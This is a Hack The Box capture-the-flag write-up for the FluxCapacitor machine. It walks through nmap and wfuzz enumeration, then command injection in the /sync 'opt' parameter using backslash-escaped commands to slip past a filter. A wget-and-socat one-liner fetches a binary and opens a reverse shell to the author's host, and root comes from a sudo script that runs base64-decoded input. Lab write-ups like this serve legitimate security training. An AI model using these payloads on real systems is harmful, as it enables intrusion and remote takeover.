---
layout: post
title: "Hack the Box - FluxCapacitor Write up"
date: 2018-05-13
description: "Write up for the Hack the box Machine FluxCapacitor."
categories: [write-up, hackthebox]
tags: [writeup, pentesting, hackthebox]
---

You can view the original write-up on my blog here: https://dastinia.io/write-up/hackthebox/2018/05/13/hackthebox-fluxcapacitor-writeup/

### Intro

![](/assets/fluxcapacitor/1.png)

FluxCapacitor was both a pretty interesting, but annoying & the frustrating box while I was doing it my first time around -- mainly due to my lack of experience with `wfuzz`. Overall once I finally completed the box, and completed a second take on it, flux taught me quite a few tricks, especially when it came to web fuzzing utilities. I highly recommend you take a crack at it if you have the time.

### Tools Used 
- [Nmap](https://nmap.org/) 
- [wfuzz](https://github.com/xmendez/wfuzz)
- cURL 
- [socat](https://github.com/craSH/socat) 



### Initial Scanning
 
Let's begin by scanning the machine FluxCapacitor at (10.10.10.69) with nmap. 


```bash
root@dastinia:~/htb/fluxcapacitor# nmap -T4 -sC -sV -n 10.10.10.69 -oA fluxcapacitor_inital

Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-09 18:50 EDT
Nmap scan report for 10.10.10.69
Host is up (0.18s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    SuperWAF
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Wed, 09 May 2018 22:50:46 GMT
......... [TRUNCATED]......
```

From our initial scan it seems as though the only service flux has is a web server. In the background, I'll go ahead and run a full port scan to ensure I didn't potentially miss any additional ports/services.

```bash
root@dastinia:~/htb/fluxcapacitor# nmap -T4 -sC -sV -n -p- 10.10.10.69 -oA fluxcapacitor_fullscan
```

### Enumeration 
Visiting the web server in our browser gives us a pretty bare site, and uneventful site.

![](/assets/fluxcapacitor/2.png)

Viewing the source of the site reveals some interesting information in a comment.

```html
<!DOCTYPE html>
<html>
<head>
<title>Keep Alive</title>
</head>
<body>
	OK: node1 alive
	<!--
		Please, add timestamp with something like:
		<script> $.ajax({ type: "GET", url: '/sync' }); </script>
	-->
	<hr/>
	FluxCapacitor Inc. info@fluxcapacitor.htb - http://fluxcapacitor.htb<br>
	<em><met><doc><brown>Roads? Where we're going, we don't need roads.</brown></doc></met></em>
</body>
</html>
```

It seems that there is a route for a page located at `/sync` in this application, which potentially has to do something with time. Attempting to visit the `/sync` page in our browser automatically redirects us to a `403 Forbidden` error message. 

![](/assets/images/htb/fluxcapacitor/3.png)

After attempting some research about `openresty/1.13.6.1` I discovered that [OpenResty](https://github.com/openresty/openresty) from what I understood was a sort of web scriptable web server built on nginx. 

I tried cURL'ing the page to see if there was any sort of "filtering" or content change based on what client you used to access the page.   

```bash
root@dastinia:~# curl  http://10.10.10.69/sync
20180513T23:25:20
```

Awesome we see a timestamp -- after a bit of fiddling around you discover that certain user agents are being filtered like the `firefox` & `gobuster` user agents.

### Fuzzing /sync
We know that `/sync` is doing _something_ underneath the hood, so the next step we can take is to try and fuzz for parameters & see how the application reacts, in the hopes of discovering additional functionality. We can use `wfuzz` tool to complete this task. 

```
root@dastinia:~/htb/fluxcapacitor# wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.69/sync?FUZZ=echo

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.69/sync?FUZZ=hostname
Total requests: 220560

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=200      2 L        1 W           19 Ch        "# directory-list-2.3-medium.txt"
000002:  C=200      2 L        1 W           19 Ch        "#"
000007:  C=200      2 L        1 W           19 Ch        "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
000003:  C=200      2 L        1 W           19 Ch        "# Copyright 2007 James Fisher"
000004:  C=200      2 L        1 W           19 Ch        "#"
000005:  C=200      2 L        1 W           19 Ch        "# This work is licensed under the Creative Commons"
000006:  C=200      2 L        1 W           19 Ch        "# Attribution-Share Alike 3.0 License. To view a copy of this"
000008:  C=200      2 L        1 W           19 Ch        "# or send a letter to Creative Commons, 171 Second Street,"
000009:  C=200      2 L        1 W           19 Ch        "# Suite 300, San Francisco, California, 94105, USA."
000010:  C=200      2 L        1 W           19 Ch        "#"
000027:  C=200      2 L        1 W           19 Ch        "search"
000028:  C=200      2 L        1 W           19 Ch        "spacer"
000030:  C=200      2 L        1 W           19 Ch        "11"
000029:  C=200      2 L        1 W           19 Ch        "privacy"
000031:  C=200      2 L        1 W           19 Ch        "logo"
000032:  C=200      2 L        1 W           19 Ch        "blog"
000033:  C=200      2 L        1 W           19 Ch        "new"
000011:  C=200      2 L        1 W           19 Ch        "# Priority ordered case sensative list, where entries were found"
000034:  C=200      2 L        1 W           19 Ch        "10"
000035:  C=200      2 L        1 W           19 Ch        "cgi-bin"
000036:  C=200      2 L        1 W           19 Ch        "faq"
000037:  C=200      2 L        1 W           19 Ch        "rss"
000040:  C=200      2 L        1 W           19 Ch        "default"
000038:  C=200      2 L        1 W           19 Ch        "home"
000039:  C=200      2 L        1 W           19 Ch        "img"
000041:  C=200      2 L        1 W           19 Ch        "2005"
........[TRUNCATED]........
``` 

As we can see we are getting a large amount of `200` responses all of with length `19` characters. They are basically the `time` garbage responses so we can use this as the baseline of stuff to ignore/filter out, so anything different then the `200` or `Char 19` is something we should potentially investigate further. 

```
root@dastinia:~/htb/fluxcapacitor# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh=19 http://10.10.10.69/sync?FUZZ=echo

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.69/sync?FUZZ=echo
Total requests: 220560

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

009874:  C=403      7 L       10 W          175 Ch        "opt"
010679:  C=200      2 L        1 W           19 Ch        "NAS"
```

Interesting we got a different response from our filter word which means that `opt` has a high change of being the parameter that `/sync` is looking for.

Side Note: This took some time, and looking back at it, I should have used a more tailored list like the [Seclist Burp Parameter Names](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) word list. Second time around doing this box it took less than two minutes to find the correct parameter. In the future, I should have done a bit more research into finding a bit more optimal list, doing so would have made this much easier. 

After fiddling around with the formatting & trying a few different escape mechanisms (it would 403 if you just straight up gave it a command) code execution was successfully achieved.

### Getting Code Execution
```bash
root@dastinia:~/htb/fluxcapacitor# curl "http://10.10.10.69/sync?opt='? \h\ostname'"
fluxcapacitor
bash: -c: option requires an argument
```

```bash
root@dastinia:~/htb/fluxcapacitor# curl "http://10.10.10.69/sync?opt='? \u\name -a'"
Linux fluxcapacitor 4.13.0-17-generic #20-Ubuntu SMP Mon Nov 6 10:04:08 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
bash: -c: option requires an argument
```
### Getting User Shell
You very quickly find out that there's a multitude of characters and words being filtered. The next objective is to get a reverse shell so we don't have to keep interacting with it through `cURL`. `Socat` is my tool of choice. It's so versatile if I have the opportunity to use it, I will....

Using forward slashes didn't work particularly well with longer commands, so we are going to make the payload that we want the `index.html` of our `python SimpleHTTPServer` so that when we curl the page the command we want is what we see like so:

```bash
root@dastinia:~/htb/fluxcapacitor# curl "http://10.10.10.69/sync?opt='? c\u\rl 10.10.14.27:9999 '"
wget -q http://10.10.14.27:9999/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.27:8282
bash: -c: option requires an argument
```

```bash
root@dastinia:~/htb/fluxcapacitor# curl "http://10.10.10.69/sync?opt='? c\u\rl 10.10.14.27:9999 -o /tmp/a'"
bash: -c: option requires an argument
root@dastinia:~/htb/fluxcapacitor# curl "http://10.10.10.69/sync?opt='? b\a\s\h /tmp/a '"
```

```bash
root@dastinia:~/htb/fluxcapacitor# socat file:`tty`,raw,echo=0 tcp-listen:8282
nobody@fluxcapacitor:/$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
nobody@fluxcapacitor:/$
```

```bash
nobody@fluxcapacitor:/home/FluxCapacitorInc$ ls -la
total 12
drwxr-xr-x 2 nobody root 4096 Dec  5 14:58 .
drwxr-xr-x 4 root   root 4096 Dec  5 14:58 ..
-rw-r--r-- 1 root   root   33 Dec  5 14:58 user.txt
nobody@fluxcapacitor:/home/FluxCapacitorInc$ cat user.txt
[redacted]
```

### Privesc & Getting Root
One of the first things I always do whenever I get on a box is running a `sudo -l` to see what sudo commands the current user can run. For a good set of boxes running this first can potentially save you a whole lot of time while privescing...

```bash
nobody@fluxcapacitor:/home/FluxCapacitorInc$ sudo -l
Matching Defaults entries for nobody on fluxcapacitor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nobody may run the following commands on fluxcapacitor:
    (ALL) ALL
    (root) NOPASSWD: /home/themiddle/.monit
``` 

So in this case it looks like that we can run whatever `/home/themiddle/.monit` is as the `root` user. So this very likely is our path for privesc. Lets see what this file contains...

```bash
nobody@fluxcapacitor:/home/FluxCapacitorInc$ cd /home/themiddle/
nobody@fluxcapacitor:/home/themiddle$ cat .monit
#!/bin/bash

if [ "$1" == "cmd" ]; then
        echo "Trying to execute ${2}"
        CMD=$(echo -n ${2} | base64 -d)
        bash -c "$CMD"
fi
```

So from what it looks like `.monit` takes in a parameter `cmd` which you can then pass in a `base64` encoded string of whatever you want (your command), then it `base64 decodes` the value & passes the result into `bash -c $value`. We can very easily use this script to get ourselves a root shell with little effort. 

```bash
nobody@fluxcapacitor:/home/themiddle$ echo "/bin/bash" | base64
L2Jpbi9iYXNoCg==
nobody@fluxcapacitor:/home/themiddle$ sudo /home/themiddle/.monit cmd L2Jpbi9iYXNoCg==
Trying to execute L2Jpbi9iYXNoCg==
```

Root :D 

```bash
root@fluxcapacitor:/home/themiddle# id
uid=0(root) gid=0(root) groups=0(root)
root@fluxcapacitor:/home/themiddle# cd /root
root@fluxcapacitor:~# cat root.txt
...[redacted]...
```

Hope this helped :D 